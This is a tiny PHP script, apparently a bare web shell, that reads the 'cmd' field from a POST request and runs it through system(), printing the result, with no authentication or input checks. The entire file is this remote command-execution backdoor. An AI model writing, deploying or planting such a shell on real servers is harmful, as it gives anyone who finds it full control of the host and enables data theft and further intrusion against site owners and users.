<?php
function execute($com)
{
	if (!empty($com))
	{
		echo system($com);
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>